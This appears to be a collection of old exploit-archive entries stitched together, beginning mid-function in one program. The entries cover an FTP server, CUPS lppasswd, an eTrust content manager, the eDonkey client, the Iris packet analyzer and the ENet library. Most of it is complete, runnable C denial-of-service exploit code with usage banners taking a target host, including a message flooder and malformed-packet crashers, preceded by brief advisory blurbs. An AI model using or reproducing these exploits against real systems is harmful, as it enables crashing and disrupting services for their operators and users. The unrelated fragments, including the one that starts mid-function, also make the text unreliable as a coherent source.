                buff + 4 + dplay8->fulldatalen,
                len - dplay8->fulldatalen);

            if(dplay8->appreservedlen) {
                printf("\nHexdump of the APPLICATION RESERVED data (%u) sent by the server:\n\n",
                    dplay8->appreservedlen);
                show_dump(
                    buff + 4 + dplay8->datalen,
                    dplay8->appreservedlen,
                    stdout);
            }

            if(dplay8->reservedlen) {
                printf("\nHexdump of the RESERVED data (%u) sent by the server:\n\n",
                    dplay8->reservedlen);
                show_dump(
                    buff + 4 + dplay8->fulldatalen + dplay8->desclen,
                    dplay8->reservedlen,
                    stdout);
            }

            fputc('\n', stdout);

        } else if(FD_ISSET(sd2, &fd_read)) {
            len = recvfrom(sd2, buff, BUFFSZ, 0, NULL, NULL);
            if(len < 0) continue;
            //if(len < 0) goto quit;

            if(buff[0] == '\\') {
                oldtype = 1;
            } else if(buff[0] == 9) {
                memcpy(gs3, GS3_QUERYX, sizeof(GS3_QUERYX) - 1);
                chall = atoi(buff + 5);
                gs3[7]  = chall >> 24;
                gs3[8]  = chall >> 16;
                gs3[9]  = chall >>  8;
                gs3[10] = chall;
                sendto(sd2, gs3, sizeof(GS3_QUERYX) - 1, 0, (struct sockaddr *)&peer, sizeof(struct sockaddr_in));
            }

            printf("\n- handle reply:\n");
            gs_handle_info(buff, len,
                oldtype ? 1 : 0, oldtype ? '\\' : '\0', oldtype ? 0 : 5, 0,
                "gamever",  &gamever,
                "hostport", &hostport,
                NULL,       NULL);

            if(gamever) {
                retver = atoi(gamever);
            }
            if(hostport && atoi(hostport)) {
                *port = htons(atoi(hostport));
                printf("\n- set hostport %hu\n", ntohs(*port));
            }
        }
    }
//quit:
    if(sd)  close(sd);
    if(sd2) close(sd2);
    return(password);
}



void show_unicode(u8 *ptr, u32 size) {
    u8  *limit = ptr + size;

    while(*ptr && (ptr <= limit)) {
        fputc(*ptr++, stdout);
        ptr++;
    }
    fputc('\n', stdout);
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec  = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        }
        host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


/*
=============================================================
DREAM FTP Server 1.0.2 (PORT) Denial of Service Exploit
=============================================================
Discovered by: InTeL
*Tested on DREAM FTP v1.02 on Windows XP SP2*

Dream FTP v1.02 also has anonymous logins enabled by default 
which enables anyone to crash the server at will.
But if the anonymous logins have been disabled try it with 
a another user/pass account

Shoutz: bryan@top-notch.ws , Digerati, Erazerz, everyone else u kno who u are
*/

#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib,"wsock32.lib")

int usage(char *);


int usage(char *filename)
{
	   printf("Dream FTP v1.02 DoS exploit\r\n");
	   printf("By InTeL\r\n");
	   printf("USAGE: %s <IP_Address> <port>\r\n", filename);

	exit(0);
}

int main(int argc, char *argv[])
{
	char evilbuf[40], recvbuf[1028];
	unsigned short port;
	struct sockaddr_in saddr;
	struct hostent *he;
	WSADATA wsaData;
	SOCKET sock;

	if(argc != 3)
		usage(argv[0]);

	port = atoi(argv[2]);	
	if(WSAStartup(MAKEWORD(2,2), &wsaData) != 0){
		printf("Unable to initialize Winsock \n");
		exit(1);
	}

	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET){
		printf("Socket Error \n");
		exit(1);
	}

	if ((he = gethostbyname(argv[1])) == NULL){  
		printf("Couldnt Resolve %s \n",argv[1]);
		exit(1);
	}

	memset(&saddr, 0, sizeof(saddr));
	saddr.sin_family = AF_INET;
	saddr.sin_addr = *((struct in_addr *)he->h_addr);	
	saddr.sin_port = htons(port);

	if (connect(sock, (struct sockaddr *)&saddr, sizeof(saddr)) == SOCKET_ERROR){
		printf("Connect Error \n");
      	exit(1);
	}

	for(int i = 0; i<3;i++){
		memset(recvbuf, 0, sizeof(recvbuf));
		recv(sock, recvbuf, 1027, 0);
	}
	printf("Logging in\r\n");	

	memset(evilbuf, 0,sizeof(evilbuf));
	strcpy(evilbuf, "USER Anonymous\r\n"); //USER
	send (sock, evilbuf, strlen(evilbuf), 0);
   
	for(i=0;i<4;i++){
		memset(recvbuf,0,sizeof(recvbuf));
		recv(sock, recvbuf, 1027, 0);
   	}
   
	memset(evilbuf, 0, sizeof(evilbuf));
	strcpy(evilbuf, "PASS Anonymous\r\n"); //PASS
	send (sock, evilbuf, strlen(evilbuf), 0);

	for(i=0; i<3;i++) {
		memset(recvbuf, 0, sizeof(recvbuf));
		recv(sock, recvbuf, 1027, 0);
   	}
	printf("Building overflow string\r\n");

	memset(evilbuf,0,sizeof(evilbuf));
	strcpy(evilbuf, "PORT ");  //PORT 
	for(i = 5;i != 36;i++)
		evilbuf[i] = 'A';
   	strcat(evilbuf,"\r\n");
	
	send (sock, evilbuf, strlen(evilbuf), 0);  
   
	printf("DoS Attack Done\r\n");
	closesocket(sock);

	return 0;
}

// milw0rm.com [2006-12-21]
source: http://www.securityfocus.com/bid/12005/info

Easy Software Products lppasswd is prone to a locally exploitable denial of service vulnerability. This issue occurs when the program attempts to write a file to the system that will exceed any file size resource limits in place. This presents a vulnerability since an unprivileged user with CUPS credentials may set these resource limits and then invoke the application. This will create an empty '/usr/local/etc/cups/passwd.new' file. If this file is present, then future invocations of lppasswd will fail.

Successful exploitation will prevent users from changing their CUPS passwords with lppasswd. 

/*
 * evil.c
 * 2004.12.11
 * Bartlomiej Sieka
 *
 * This program executes the lpasswd(1) password changing utility
 * in way that prevents its further use, i.e. after this program
 * has been executed, all users on the system will be unable to change
 * their CUPS passwords. This is not a documented feature of lppasswd(1)
 * and is certainly unauthorized.
 *
 * This program has been tested with lppasswd(1) versions 1.1.19 and
 * 1.1.22 on FreeBSD 5.2.
 *
 * The recipe:
 * gcc -o evil evil.c
 * ./evil
 * Type in passwords as requested, and voila! This will create an empty
 * file /usr/local/etc/cups/passwd.new. The existence of this file makes
 * lppasswd(1) quit before changing users password with message
 * "lppasswd: Password file busy!".
 */

#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <unistd.h>
extern char **environ;

int main(int argc, char **argv){

  char *cmd = "/usr/local/bin/lppasswd";
  char *args[] = { "/usr/local/bin/lppasswd", 0x00 };

  /* set the file size limit to 0 */
  struct rlimit rl;
  rl.rlim_cur = 0;
  rl.rlim_max = 0;
  setrlimit(RLIMIT_FSIZE, &rl);

  /* execute the poor victim */
  execve(cmd, args, environ);
}

/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1"
#define PORT        1882
#define BUFFSZ      256



int putxx(u8 *data, u32 num, int bits);
int timeout(int sock, int sec);
u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd,
            len,
            attack,
            first   = 1;
    u16     port    = PORT;
    u8      buff[BUFFSZ],
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "eTrust Secure Content Manager (eCSqdmn) <= 8.0.28000.511 Denial of Service "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <attack> <host> [port(%hu)]\n"
            "\n"
            "Attacks:\n"
            " 1 = invalid memory access in eCSqdmn (will be kept down continuosly)\n"
            " 2 = endless loop in eCSqdmn\n"
            "\n", argv[0], port);
        exit(1);
    }

    attack = atoi(argv[1]);

    if(argc > 3) port = atoi(argv[3]);
    peer.sin_addr.s_addr = resolv(argv[2]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    for(;;) {
        sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if(sd < 0) std_err();
        if(connect(sd, (struct sockaddr *)&peer, sizeof(peer)) < 0) {
            if(first) std_err();
            printf("- retry connection\n");
            sleep(ONESEC);
            continue;
        }
        if(first) {
            if(attack == 1) printf("- start attack for keeping the process down\n");
            first = 0;
        }

        p = buff;
        p += putxx(p, 0x0101,       16);
        p += putxx(p, 0,            8);
        p += putxx(p, 1,            8);
        p += putxx(p, 1 + 4,        32);
        p += putxx(p, 0,            32);

        printf("- send header\n");
        send(sd, buff, p - buff, 0);

        p = buff;
        p += putxx(p, 1,            8);
        if(attack == 1) {
            p += putxx(p, 99999999, 32);
        } else {
            p += putxx(p, -5,       32);
        }

        printf("- send data\n");
        send(sd, buff, p - buff, 0);

        while(!timeout(sd, 3)) {
            len = recv(sd, buff, BUFFSZ, 0);
            if(len <= 0) break;
        }

        close(sd);
        if(attack == 2) break;
    }

    printf("- done\n");
    return(0);
}



int putxx(u8 *data, u32 num, int bits) {
    int     i,
            bytes;

    bytes = bits >> 3;
    for(i = 0; i < bytes; i++) {
        data[i] = (num >> ((bytes - 1 - i) << 3)) & 0xff;
    }
    return(bytes);
}



int timeout(int sock, int sec) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec  = sec;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


/*

Edonkey2000 & Overnet <= 0.45 message flooder
by Auriemma Luigi
e-mail: aluigi@pivx.com
web:    http://www.pivx.com/luigi/


This tool sends a lot of messages to graphic clients based on Edonkey
technology.

Everytime that a message arrives to a client, it will create a new
dialog on the screen if the sender nick and nick hash are different.
So the problem is that a lot of resources are consumed when a new
message arrive.

With Edonkey2000, after 500 connections a P400 is really unuseable (it
has so poor resources that is impossible to execute any program).


NOTE: For compile this tool on Win you must specify -DWIN on you
      compiler


UNIX & WIN VERSION
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include "edinfo.h"

#ifdef WIN
	#include <winsock.h>
	#include "winerr.h"

	#define close	closesocket
#else
	#include <unistd.h>
	#include <sys/socket.h>
	#include <sys/types.h>
	#include <arpa/inet.h>
	#include <netdb.h>

	void std_err(void) {
		perror("\nError");
		exit(1);
	}
#endif



#define VER	"0.1.1"
#define PORT	4662
#define MAX	2147483647
#define TIMEOUT	5
#define OFFSET1	7	/* where starts the hash (16 bytes size)*/
#define OFFSET2	39	/* where starts the nick (I have setted it to 4 bytes size) */
#define PCK	"\xE3\x24\x00\x00\x00\x01\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFF\x00\x00\x00" \
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
/* msg */	"\xE3\x03\x00\x00\x00\x4E\x00\x00"
#define PCKBIG	"\xE3\x3c\x00\x00\x00\x01\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFF\x03\x00\x00" \
		"\x00\x02\x01\x00\x01\x04\x00\x00\x00\x00\x00\x03\x01\x00\x11\x3C" \
		"\x00\x00\x00\x03\x01\x00\x0F\x36\x12\x00\x00\x00\x00\x00\x00\x00" \
		"\x00" \
/* msg */	"\xE3\x09\x00\x00\x00\x4E\x06\x00" \
		"Hello!"



void timeout(int sock);
unsigned long resolv(char *host);




int main(int argc, char *argv[]) {
	u_char		*buff,
			big = 0,
			info = 1;
	int		sd,
			err;
	u_long		i,
			num = MAX,
			randme;
	u_short		port = PORT,
			pcksz = 0;
	struct	sockaddr_in	peer;

	#ifdef WIN
	WSADATA wsadata;
	WSAStartup(MAKEWORD(1,0), &wsadata);
	#endif


	setbuf(stdout, NULL);

	printf("\n"
		"Edonkey2000 & Overnet <= 0.45 message flooder %s\n"
		"by Auriemma Luigi\n"
		"e-mail: aluigi@pivx.com\n"
		"web:    http://www.pivx.com/luigi/\n"
		"\n", VER);

	if(argc < 2) {
		printf("\nUsage: [options] %s <host>\n"
			"\nOptions:\n"
			"-n NUM     number of messages to send (default %u)\n"
			"-p PORT    host port (default %u)\n"
			"-i         NO info. Don't try to send a hello packet for get info\n"
			"-b         use a normal/big packet (default is tiny)\n"
			"\nExplanation:\n"
			"- Tiny packet (default) is used for fast flooding\n"
			"- Big/normal packet (-b flag) has been added just for compatibility\n"
			"\n", argv[0], MAX, PORT);
		exit(1);
	}


	argc--;
	for(i = 1; i < argc; i++) {
		switch(argv[i][1]) {
			case 'n': num = (atol(argv[++i]) + 1); break;
			case 'p': port = atol(argv[++i]); break;
			case 'i': info = 0; break;
			case 'b': big = 1; break;
			default: {
				printf("\nError: wrong argument (%s)\n", argv[i]);
				exit(1);
			}
		}
	}


	srand(time(NULL));

	peer.sin_addr.s_addr  = resolv(argv[argc]);
	peer.sin_port         = htons(port);
	peer.sin_family       = AF_INET;

	printf("\nConnections to %s:%u\n\n",
		inet_ntoa(peer.sin_addr), htons(peer.sin_port));


	if(info) {
		sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if(sd < 0) std_err();
		err = connect(sd, (struct sockaddr *)&peer, sizeof(peer));
		if(err < 0) std_err();
		err = edinfo(sd);
		if(err < 0) {
			printf("\nError: host is not an Edonkey client\n");
			exit(1);
		}
		close(sd);
	}


	if(big) {
		pcksz = sizeof(PCKBIG) - 1;
		buff = malloc(pcksz);
		if(!buff) std_err();
		memcpy(buff, PCKBIG, pcksz);
	} else {
		pcksz = sizeof(PCK) - 1;
		buff = malloc(pcksz);
		if(!buff) std_err();
		memcpy(buff, PCK, pcksz);
	}

	
	randme = rand();
	printf("The random number for better hash creation is: %lu\n\n", randme);

	for(i = 1; i < num; i++, randme++) {
		sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if(sd < 0) std_err();
		err = connect(sd, (struct sockaddr *)&peer, sizeof(peer));
		if(err < 0) {
			if(i > 1) {
				printf("\n\nImpossible to connect to the remote host\n"
					"Probably is going down during the attack\n\n");
				exit(1);
			}
			std_err();
		}

		memcpy(buff + OFFSET1, &randme, 4);
		memcpy(buff + OFFSET1 + 4, &i, 4);	/* unuseful, just for be sure */

		if(big) memcpy(buff + OFFSET2, &i, 4);

		send(sd, buff, pcksz, 0);
		timeout(sd);
		close(sd);

		printf("%lu\r", i);
		sleep(0);
	}

	printf("\n\nFlooding terminated\n\n");
	return(0);
}




void timeout(int sock) {
	struct	timeval	timeout;
	fd_set	fd_read;
	int	err;


	timeout.tv_sec = TIMEOUT;
	timeout.tv_usec = 0;

	FD_ZERO(&fd_read);
	FD_SET(sock, &fd_read);
	err = select(sock + 1, &fd_read, NULL, NULL, &timeout);
	if(err < 0) std_err();
	if(err == 0) {
		printf("\nError: Socket timeout, no answers received\n");
		exit(1);
	}
}



u_long resolv(char *host) {
        struct  hostent *hp;
        unsigned long   host_ip;

        host_ip = inet_addr(host);
        if(host_ip == INADDR_NONE) {
                hp = gethostbyname(host);
                if(!hp) {
			printf("\nError: Unable to resolv hostname (%s)\n",
				host);
			exit(1);
		}
                else host_ip = *(u_long *)(hp->h_addr);
        }

	return(host_ip);
}


source: http://www.securityfocus.com/bid/2278/info

A maliciously-formed packet sent to Iris by a remote attacker, upon opening in the program for analysis by a user, will cause Iris to terminate.

The crash is caused by an inability of Iris to handle packets with malformed values in its headers. 

/* Denial of Service attack against :
 * Iris The Network Traffic Analyzer beta 1.01
 * ------------------------------------------------
 *
 * Will create an incorrect packet which will cause
 * Iris to hang when it is opened by a user.
 *
 * Vulnerability found by : grazer@digit-labs.org
 * Exploit code by : grazer@digit-labs.org
 *
 * Respect to the guys from eEye, for there fast
 * response.
 *
 * greetings to hit2000, hwa, synnergy, security.is
 *              digit-labs.
 *
 * ---------------> free sk8!!!! <-----------------
 *
 * ------------------------------------------------
 * http://www.digit-labs.org
 *                           grazer@digit-labs.org
 * ------------------------------------------------
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/types.h>
#include <sys/socket.h>

int build_packet(int sfd, u_long srcaddr, u_long dstaddr);

struct pseudo {
u_long saddr;
u_long daddr;
u_char zero;
u_char protocol;
u_short length;
};

int main(int argc,char **argv){
int rawfd, check, one=1;

struct sockaddr_in raddr;
struct in_addr source_ip, desti_ip;
struct ip *ip;
struct tcphdr *tcp;

        while (argc<3) {
        fprintf(stderr, "\n\n[ IRIS DoS attack - by grazer ]");
        fprintf(stderr, "\n %s localhost remotehost \n\n", argv[0] );  exit(0);}

        fprintf(stderr, "\nStarting Iris DoS...\n");
        if((check=gethostbyname(argv[2])==NULL)) {
        fprintf(stderr, "\nCannot resolve host %s\n", argv[2]); exit(0); }

        source_ip.s_addr= inet_addr(argv[1]);
        desti_ip.s_addr =       inet_addr(argv[2]);

        if ((rawfd=socket(PF_INET, SOCK_RAW, IPPROTO_TCP))<0) {
        fprintf(stderr, "\n You need root for this..");
        exit(0); }

        setsockopt(rawfd, IPPROTO_IP, IP_HDRINCL, &one, 1);

        build_packet(rawfd,source_ip.s_addr, desti_ip.s_addr);

    close(rawfd);
return 1; }


int build_packet(int sfd, u_long srcaddr,  u_long dstaddr) {

u_char packet[sizeof(struct ip) + sizeof(struct pseudo) + sizeof(struct tcphdr)];
struct sockaddr_in sin;
struct in_addr src_inaddr, dest_inaddr;
struct ip *ip = (struct ip *) packet;
struct pseudo *pseudo = (struct pseudo *) (packet + sizeof(struct ip));
struct tcphdr *tcp = (struct tcphdr *) (packet + sizeof(struct ip)
+ sizeof(struct pseudo));

        bzero(packet, sizeof(packet));
        bzero(&sin,sizeof(sin));

        src_inaddr.s_addr = srcaddr;
        dest_inaddr.s_addr = dstaddr;

        pseudo->saddr = srcaddr;
        pseudo->daddr = dstaddr;
        pseudo->zero = 1;
        pseudo->protocol=IPPROTO_TCP;
        pseudo->length = htons(sizeof (struct tcphdr));

        ip->ip_v = -1;
        ip->ip_hl = -1;
        ip->ip_id = -1;
        ip->ip_src = src_inaddr;
        ip->ip_dst = dest_inaddr;
        ip->ip_p = IPPROTO_TCP;
        ip->ip_ttl = 40;
        ip->ip_off = -1;
        ip->ip_len = sizeof(struct ip) + sizeof(struct tcphdr);
        tcp->seq = htonl(rand());
        tcp->ack = htonl(rand());

        sin.sin_family=AF_INET;
        sin.sin_addr.s_addr=dstaddr;
        sendto(sfd,packet,sizeof(struct ip) + sizeof(struct tcphdr), 0,
        (struct sockaddr *) &sin,sizeof(sin));

        fprintf(stderr, "\n Packet send... \n\n" );

   return 1;}
source: http://www.securityfocus.com/bid/17087/info

ENet is prone to multiple denial-of-service vulnerabilities. A remote attacker can send specifically crafted data to trigger these flaws, leading to a denial-of-service condition.

/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include "enet_protocol.h"

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define ONESEC  1000
    #define MYRAND  clock()
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>
    #include <sys/times.h>

    #define ONESEC  1
    #define MYRAND  times(0)
    #define strnicmp    strncasecmp
#endif



#define VER     "0.1"



u_int get_num(u_char *str);
int send_recv(int sd, u_char *in, int insz, u_char *out, int outsz, int err);
int timeout(int sock);
u_int resolv(char *host);
void std_err(void);



struct  sockaddr_in peer;
u_int   commandLength = 0xffff0000;



int main(int argc, char *argv[]) {
    ENetProtocolHeader  *header;
    ENetProtocol        *command;
    u_int   chall,
            stime;
    int     sd,
            len,
            attack;
    u_char  buff[8192];

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "ENet library <= Jul 2005 multiple vulnerabilities "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <attack> <host> <port> [commandLength(0x%08x)]\n"
            "\n"
            "Attack:\n"
            " 1 = invalid memory access\n"
            " 2 = allocation abort with fragment\n"
            "\n"
            "  Default port examples: Cube on 28765, Sauerbraten on 28785\n"
            "  commandLength is the big value to use for both the attacks, read my advisory\n"
            "\n", argv[0], commandLength);
        exit(1);
    }

    header  = (ENetProtocolHeader *)buff;
    command = (ENetProtocol *)(buff + sizeof(ENetProtocolHeader));

    attack = atoi(argv[1]);
    if(argc > 4) commandLength = get_num(argv[4]);

    peer.sin_addr.s_addr = resolv(argv[2]);
    peer.sin_port        = htons(atoi(argv[3]));
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr),
        ntohs(peer.sin_port));

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    stime = MYRAND;
    chall = ~stime;

    if(attack == 1) {
        printf("- send malformed packet\n");

        header->peerID                              = htons(0xffff);
        header->flags                               = 0;
        header->commandCount                        = 1 + (MYRAND % 255);       //  major than 1
        header->sentTime                            = stime;
        header->challenge                           = chall;
        command->header.command                     = ENET_PROTOCOL_COMMAND_CONNECT;
        command->header.channelID                   = 0xff;
        command->header.flags                       = ENET_PROTOCOL_FLAG_ACKNOWLEDGE;
        command->header.reserved                    = 0;
        command->header.commandLength               = htonl(commandLength);     // BOOM
        command->header.reliableSequenceNumber      = htonl(1);
        command->connect.outgoingPeerID             = htons(0);
        command->connect.mtu                        = htons(1400);
        command->connect.windowSize                 = htonl(32768);
        command->connect.channelCount               = htonl(ENET_PROTOCOL_MINIMUM_CHANNEL_COUNT);
        command->connect.incomingBandwidth          = htonl(0);
        command->connect.outgoingBandwidth          = htonl(0);
        command->connect.packetThrottleInterval     = htonl(5000);
        command->connect.packetThrottleAcceleration = htonl(2);
        command->connect.packetThrottleDeceleration = htonl(2);

        len = send_recv(sd,
            buff, sizeof(ENetProtocolCommandHeader) + sizeof(ENetProtocolConnect),
            buff, sizeof(buff), 0);
        if(len < 0) {
            printf("- no reply from the server, it should be already crashed\n");
        }

    } else if(attack == 2) {

        printf("- start connection to host\n");

        printf("  send connect\n");
        header->peerID                              = htons(0xffff);
        header->flags                               = 0;
        header->commandCount                        = 1;
        header->sentTime                            = stime;
        header->challenge                           = chall;
        command->header.command                     = ENET_PROTOCOL_COMMAND_CONNECT;
        command->header.channelID                   = 0xff;
        command->header.flags                       = ENET_PROTOCOL_FLAG_ACKNOWLEDGE;
        command->header.reserved                    = 0;
        command->header.commandLength               = htonl(sizeof(ENetProtocolConnect));
        command->header.reliableSequenceNumber      = htonl(1);
        command->connect.outgoingPeerID             = htons(0);
        command->connect.mtu                        = htons(1400);
        command->connect.windowSize                 = htonl(32768);
        command->connect.channelCount               = htonl(2);
        command->connect.incomingBandwidth          = htonl(0);
        command->connect.outgoingBandwidth          = htonl(0);
        command->connect.packetThrottleInterval     = htonl(5000);
        command->connect.packetThrottleAcceleration = htonl(2);
        command->connect.packetThrottleDeceleration = htonl(2);

        len = send_recv(sd,
            buff, sizeof(ENetProtocolCommandHeader) + ntohl(command->header.commandLength),
            buff, sizeof(buff), 1);

        printf("  send ack\n");
/* SRV  header->peerID                              */
        header->flags                               = 0;
        header->commandCount                        = 1;
        stime = ntohl(header->sentTime);                                        // useless???
        header->sentTime                            = htonl(stime + 1);
/* SRV  header->challenge                           */
        command->header.command                     = ENET_PROTOCOL_COMMAND_ACKNOWLEDGE;
/* SRV  command->header.channelID                   */  
        command->header.flags                       = 0;
        command->header.reserved                    = 0;
        command->header.commandLength               = htonl(sizeof(ENetProtocolAcknowledge));
        command->header.reliableSequenceNumber      = htonl(1);
/* SRV  command->acknowledge.receivedReliableSequenceNumber */
        command->acknowledge.receivedSentTime       = htonl(stime);

        len = send_recv(sd,
            buff, sizeof(ENetProtocolCommandHeader) + ntohl(command->header.commandLength),
            buff, sizeof(buff), 1);

        printf("  send malformed fragment\n");
        len = 10 + (MYRAND % 1000);
/* SRV  header->peerID                              */
        header->flags                               = 0;
        header->commandCount                        = 1;
        header->sentTime                            = htonl(ntohl(header->sentTime) + 1);
/* SRV  header->challenge                           */
        command->header.command                     = ENET_PROTOCOL_COMMAND_SEND_FRAGMENT;
        command->header.channelID                   = 0;
        command->header.flags                       = ENET_PROTOCOL_FLAG_ACKNOWLEDGE;
        command->header.reserved                    = 0;
        command->header.commandLength               = htonl(sizeof(ENetProtocolSendFragment) + len);
        command->header.reliableSequenceNumber      = htonl(1);
        command->sendFragment.startSequenceNumber   = htonl(1);
        command->sendFragment.fragmentCount         = htonl(2 + (MYRAND % 2000));
        command->sendFragment.fragmentNumber        = htonl(0);
        command->sendFragment.totalLength           = htonl(commandLength);
        command->sendFragment.fragmentOffset        = htonl(0);
        memset(command + sizeof(ENetProtocolSendFragment), len, len);   // first len is for random

        len = send_recv(sd,
            buff, sizeof(ENetProtocolCommandHeader) + ntohl(command->header.commandLength),
            buff, sizeof(buff), 0);
        if(len < 0) {
            printf("- no reply from the server, it should be already crashed\n");
        }
    }

    close(sd);

    printf("- check server:\n");
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    stime = MYRAND;
    chall = ~stime;

    header->peerID                              = htons(0xffff);
    header->flags                               = 0;
    header->commandCount                        = 1;
    header->sentTime                            = stime;
    header->challenge                           = chall;
    command->header.command                     = ENET_PROTOCOL_COMMAND_CONNECT;
    command->header.channelID                   = 0xff;
    command->header.flags                       = ENET_PROTOCOL_FLAG_ACKNOWLEDGE;
    command->header.reserved                    = 0;
    command->header.commandLength               = htonl(sizeof(ENetProtocolConnect));
    command->header.reliableSequenceNumber      = htonl(1);
    command->connect.outgoingPeerID             = htons(0);
    command->connect.mtu                        = htons(1400);
    command->connect.windowSize                 = htonl(32768);
    command->connect.channelCount               = htonl(ENET_PROTOCOL_MINIMUM_CHANNEL_COUNT);
    command->connect.incomingBandwidth          = htonl(0);
    command->connect.outgoingBandwidth          = htonl(0);
    command->connect.packetThrottleInterval     = htonl(5000);
    command->connect.packetThrottleAcceleration = htonl(2);
    command->connect.packetThrottleDeceleration = htonl(2);

    len = send_recv(sd,
        buff, sizeof(ENetProtocolCommandHeader) + ntohl(command->header.commandLength),
        buff, sizeof(buff), 0);
    if(len < 0) {
        printf("\n  Server IS vulnerable!!!\n\n");
    } else {
        printf("\n  Server does not seem vulnerable\n\n");
    }
    close(sd);  
    return(0);
}



u_int get_num(u_char *str) {
    u_int   offset;

    if(!strnicmp(str, "0x", 2)) {
        sscanf(str + 2, "%x", &offset);
    } else {
        sscanf(str, "%u", &offset);
    }
    return(offset);
}



int send_recv(int sd, u_char *in, int insz, u_char *out, int outsz, int err) {
    int     retry,
            len;

    for(retry = 3; retry; retry--) {
        if(sendto(sd, in, insz, 0, (struct sockaddr *)&peer, sizeof(peer))
          < 0) std_err();
        if(!timeout(sd)) break;
    }

    if(!retry) {
        if(!err) return(-1);
        fputs("\nError: socket timeout, no reply received\n\n", stdout);
        exit(1);
    }

    len = recvfrom(sd, out, outsz, 0, NULL, NULL);
    if(len < 0) std_err();
    return(len);
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec  = 2;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_int resolv(char *host) {
    struct  hostent *hp;
    u_int   host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_int *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endifsource: http://www.securityfocus.com/bid/1298/info

xterm is a popular X11-based terminal emulator. If VT control-characters are displayed in the xterm, they can be interpreted and used to cause a denial of service attack against the client (and even the host running the client). What makes it possible for remote users to exploit this vulnerability is a situation like this:

An admin is tailing the http access log

Attacker requests url with control characters in it

Admin's xterm crashes

